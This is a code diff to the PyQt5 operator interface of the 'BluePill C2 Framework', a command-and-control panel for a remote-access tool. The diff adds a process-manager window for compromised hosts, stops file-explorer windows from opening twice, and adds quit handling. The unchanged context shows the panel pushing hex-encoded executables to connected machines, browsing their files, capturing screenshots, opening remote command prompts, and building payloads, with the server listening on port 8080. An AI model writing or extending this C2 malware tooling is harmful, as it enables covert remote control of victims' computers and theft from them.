@@ -8,6 +8,7 @@ from src.add_data import add_new_data
 from src.listener import BluePill
 from src.filenav import FileExplorerApp
 from src.Command import CommandPromptWindow
+from src.processlist import ProcessList
 from src.RemoteCapture import ScreenshotWindow
 import threading
 import base64
@@ -17,6 +18,7 @@ from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QLabel, QPus
 from PyQt5.QtGui import QColor
 from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTreeWidget, QTreeWidgetItem, QLineEdit, QComboBox, QLabel, QDialog, QVBoxLayout, QDialogButtonBox, QFormLayout
 from src.builder import Build
+
 class TitleBar(QWidget):
     def __init__(self):
         super().__init__()
@@ -177,7 +179,9 @@ class BuilderWindow(QMainWindow):
         msg_box.setText(message)
         msg_box.exec_()
 
-
+def quit_app():
+    print("EXITED")
+    app.quit()
 class ImageLabelUpdateEvent(QEvent):
     def __init__(self, pixmap):
         super().__init__(QEvent.User)
@@ -224,6 +228,7 @@ class MyWindow(QMainWindow):
                 background-color: #777;
             }
         """
+        app.aboutToQuit.connect(quit_app)
         QApplication.setStyle('Fusion')
         self.setStyleSheet(dark_stylesheet)
         self.setWindowTitle("BluePill C2 Framework")
@@ -328,6 +333,10 @@ class MyWindow(QMainWindow):
         self.remove_icon = b'iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeBAMAAADJHrORAAAAJFBMVEXRAABHcEzRAADRAADRAADRAADRAADRAADRAADRAADRAADRAAAVPsrJAAAAC3RSTlMfALrAtBjsAjFgYpSAdqIAAADOSURBVBjTYxBEBQyE+eKtUHZEIZgvmcII5gq4TQTxxaftdgDzmXZnFgL5Etm7N4EUCGjv3tYI5Itq796tAJbevSkQpB/EYBQUsAYLM4AV7jYQZN69ewsjxH6W3bs3MwClHaDuEfDevdsYIg1xH1ABELjC3SsKVLB7SyDC/SEwaSgfaCXYDVC+AFg9oyCqeQ6COOwDSm9i0Ia7ByStADIS6l4WiH8gChjAjoH6d0sgJDw2I4cHMLwMoI7KAoWXoFQyJDwL1BZiDW/BQhLiCwDVVWOoPYoEwgAAAABJRU5ErkJggg=='
         self.remote_icon = b'iVBORw0KGgoAAAANSUhEUgAAAB4AAAAbCAMAAABcI88jAAAAS1BMVEX///9UVFTS0tISEhL9/f0DAwP7+/sAAABLS0sGBgZra2sMDAyNjY0dHR3e3t6ysrKampqBgYH5+fk0NDRoaGg5OTnKyso9PT1kZGQI95hjAAAA2UlEQVQoz3XT4XaDIAwF4MgiAQMitLN9/yddGC2VLdw/HvwOiHgF4/w6iXcGHM2zLsAUl0kiMXhyBe0laNsYiyP/y3ANHrndUNkevGY7YwxMHFBh7GqVxUs4ABITZYT/jHnlA8yNyO0aB0/Vv7v/WTx3fxZta5mIk3g8tffe5fhvRq5GeXZXeG185PJ8ac84O8VRO7dDgnMfFGzjx2nUnA/hSP5rEk8R5BtMwwFK2u5byz3WfsX3cNvS2ISlTlksaMFaLolUDxVOtZoSKW5SOHy2FFR+/x0X/gGpPhCR8haLwwAAAABJRU5ErkJggg=='
 
+    def exit_application(self):
+        for apps in self.file_explorer:
+            try: apps.close()
+            except: pass
     def start_bluepill_server(self):
         # Create a thread to run the initiate_server method
         server_thread = threading.Thread(target=self.bluepill.initiate_server, args=('0.0.0.0', 8080))
@@ -376,15 +385,20 @@ class MyWindow(QMainWindow):
                 hex_bytecode = "".join(f"{byte:02X}" for byte in binary_data)
             self.bluepill.send(b"executable->" + hex_bytecode.encode('utf-8'), self.connection[int(row_id)-1])
         elif action == file_explorer:
-            self.bluepill.send(b"dir->Unknown", self.connection[int(row_id)-1])
-            self.file_explorer[int(row_id)-1] = FileExplorerApp(str(row_id), parent=self)
-            self.file_explorer[int(row_id)-1].show()
+            if not self.file_explorer[int(row_id)-1]:
+                self.bluepill.send(b"dir->Unknown", self.connection[int(row_id)-1])
+                self.file_explorer[int(row_id)-1] = FileExplorerApp(str(row_id), parent=self)
+                self.file_explorer[int(row_id)-1].show()
         elif action == process_manager:
             self.bluepill.send(b"GETPIDS", self.connection[int(row_id)-1])
+            self.process_manager[int(row_id)-1] = ProcessList(str(row_id))
+            self.process_manager[int(row_id)-1].show()
+            
     def openBuilderWindow(self):
         builder_window = BuilderWindow(self)
         builder_window.show()
 if __name__ == '__main__':
+    global app
     app = QApplication(sys.argv)
     window = MyWindow()
     window.show()
